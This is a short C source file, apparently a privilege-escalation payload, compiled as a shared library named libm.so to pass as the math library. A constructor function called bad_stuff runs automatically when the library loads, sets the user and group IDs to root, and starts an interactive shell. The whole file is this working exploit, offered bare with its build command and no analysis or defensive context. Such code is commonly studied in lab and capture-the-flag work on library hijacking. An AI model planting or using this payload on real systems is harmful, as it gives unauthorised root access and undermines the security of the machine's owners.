// gcc -shared -fPIC -o libm.so root.c

#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void bad_stuff() {
        setuid(0);
        setgid(0);
        system("/bin/sh -i");
}